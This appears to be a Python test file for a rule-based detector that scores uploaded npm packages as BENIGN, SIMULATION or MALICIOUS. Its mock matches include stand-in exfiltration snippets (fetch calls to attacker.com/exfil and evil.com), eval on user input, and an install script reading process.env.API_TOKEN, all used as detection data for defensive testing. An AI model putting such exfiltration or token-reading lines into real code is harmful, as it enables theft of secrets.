"""
Test Pipeline for Rule-Based Prediction Engine
Tests verdict calculation and API response structure.
"""

from backend_ml.feature_extraction.npm_detector import get_verdict
import json


def test_large_safe_project():
    """
    Scenario 1: Large Safe Project (College ERP)
    Input: total_files = 216, total_points = 150 (mostly 1pt network matches).
    Expected Output: verdict must be BENIGN.
    """
    print("=" * 60)
    print("TEST 1: Large Safe Project (College ERP)")
    print("=" * 60)
    
    # Create mock matches (150 network matches = 150 points)
    mock_matches = []
    for i in range(150):
        mock_matches.append({
            'filename': f'file{i}.js',
            'line_number': i,
            'code_snippet': 'const url = "https://example.com"',
            'category': 'NETWORK_EXFIL',
            'matched_text': 'https://'
        })
    
    result = get_verdict(mock_matches, 'college-erp.zip', 216)
    
    print(f"  Input: files=216, points=150")
    print(f"  Output: verdict={result['verdict']}, density={result['density']:.2f}")
    print(f"  Reasoning: {result['reasoning']}")
    
    assert result['verdict'] == 'BENIGN', f"Expected BENIGN, got {result['verdict']}"
    print("  ✅ PASSED: Verdict is BENIGN\n")


def test_security_simulation():
    """
    Scenario 2: Security Simulation (GitHub Goat)
    Input: total_files = 89, total_points = 335, filename = 'github-actions-goat.zip'.
    Expected Output: verdict must be SIMULATION.
    """
    print("=" * 60)
    print("TEST 2: Security Simulation (GitHub Goat)")
    print("=" * 60)
    
    # Create mock matches (335 points worth)
    mock_matches = []
    
    # Add 10 DANGEROUS_APIS = 250 points (10 * 25)
    for i in range(10):
        mock_matches.append({
            'filename': f'script{i}.js',
            'line_number': i,
            'code_snippet': 'eval(userInput)',
            'category': 'DANGEROUS_APIS',
            'matched_text': 'eval('
        })
    
    # Add high-risk NETWORK = 50 points each (2 * 50 = 100)
    for i in range(2):
        mock_matches.append({
            'filename': f'install.js',
            'line_number': i,
            'code_snippet': 'fetch("http://attacker.com/exfil")',
            'category': 'NETWORK_EXFIL',
            'matched_text': 'attacker.com'
        })
    
    # Add some generic network (1 point each) = 5 points
    for i in range(5):
        mock_matches.append({
            'filename': f'utils.js',
            'line_number': i,
            'code_snippet': 'const api = "https://api.github.com"',
            'category': 'NETWORK_EXFIL',
            'matched_text': 'https://'
        })
    
    result = get_verdict(mock_matches, 'github-actions-goat.zip', 89)
    
    print(f"  Input: files=89, points=335, filename='github-actions-goat.zip'")
    print(f"  Output: verdict={result['verdict']}, density={result['density']:.2f}")
    print(f"  Reasoning: {result['reasoning']}")
    
    assert result['verdict'] == 'SIMULATION', f"Expected SIMULATION, got {result['verdict']}"
    print("  ✅ PASSED: Verdict is SIMULATION\n")


def test_real_small_threat():
    """
    Scenario 3: Real Small Threat
    Input: total_files = 5, total_points = 125 (contains process.env and attacker.com), filename = 'utils.zip'.
    Expected Output: verdict must be MALICIOUS.
    """
    print("=" * 60)
    print("TEST 3: Real Small Threat")
    print("=" * 60)
    
    # Create mock matches (125 points worth)
    mock_matches = []
    
    # Add 5 DANGEROUS_APIS = 125 points (5 * 25)
    for i in range(5):
        mock_matches.append({
            'filename': f'install.js',
            'line_number': i,
            'code_snippet': 'const token = process.env.API_TOKEN',
            'category': 'DANGEROUS_APIS',
            'matched_text': 'process.env'
        })
    
    result = get_verdict(mock_matches, 'utils.zip', 5)
    
    print(f"  Input: files=5, points=125, filename='utils.zip'")
    print(f"  Output: verdict={result['verdict']}, density={result['density']:.2f}")
    print(f"  Reasoning: {result['reasoning']}")
    
    assert result['verdict'] == 'MALICIOUS', f"Expected MALICIOUS, got {result['verdict']}"
    print("  ✅ PASSED: Verdict is MALICIOUS\n")


def test_api_response_structure():
    """
    Scenario 4: API Check
    Verify main.py returns correct JSON keys: verdict, risk_score, total_points, raw_matches.
    """
    print("=" * 60)
    print("TEST 4: API Response Structure")
    print("=" * 60)
    
    # Test data
    mock_zip_filename = "test-package.zip"
    mock_total_files = 10
    
    # Create mock matches
    mock_matches = [
        {
            'filename': 'index.js',
            'line_number': 5,
            'code_snippet': 'eval(data)',
            'category': 'DANGEROUS_APIS',
            'matched_text': 'eval('
        },
        {
            'filename': 'install.js',
            'line_number': 10,
            'code_snippet': 'fetch("http://evil.com")',
            'category': 'NETWORK_EXFIL',
            'matched_text': 'http://'
        }
    ]
    
    # Get verdict
    verdict_result = get_verdict(mock_matches, mock_zip_filename, mock_total_files)
    
    # Build expected API response structure
    result_json = {
        "verdict": verdict_result.get('verdict', 'UNKNOWN'),
        "risk_score": verdict_result.get('risk_score', 0),
        "total_files": mock_total_files,
        "total_points": verdict_result.get('total_points', 0),
        "reasoning": verdict_result.get('reasoning', '')
    }
    
    print(f"  API Response Structure:")
    print(f"  {json.dumps(result_json, indent=2)}")
    
    # Check required keys
    required_keys = ['verdict', 'risk_score', 'total_files', 'total_points', 'reasoning']
    for key in required_keys:
        assert key in result_json, f"Missing key: {key}"
    
    # Verify raw_matches would be included (returned separately in API)
    print(f"\n  raw_matches would include {len(mock_matches)} items")
    assert len(mock_matches) > 0, "raw_matches should not be empty"
    
    print("  ✅ PASSED: API response has correct structure\n")


def run_all_tests():
    """Run all test cases."""
    print("\n" + "=" * 60)
    print("STARTING TEST PIPELINE")
    print("=" * 60 + "\n")
    
    try:
        test_large_safe_project()
        test_security_simulation()
        test_real_small_threat()
        test_api_response_structure()
        
        print("=" * 60)
        print("ALL TESTS PASSED ✅")
        print("=" * 60)
        
    except AssertionError as e:
        print(f"\n❌ TEST FAILED: {e}")
        raise
    except Exception as e:
        print(f"\n❌ ERROR: {e}")
        raise


if __name__ == "__main__":
    run_all_tests()
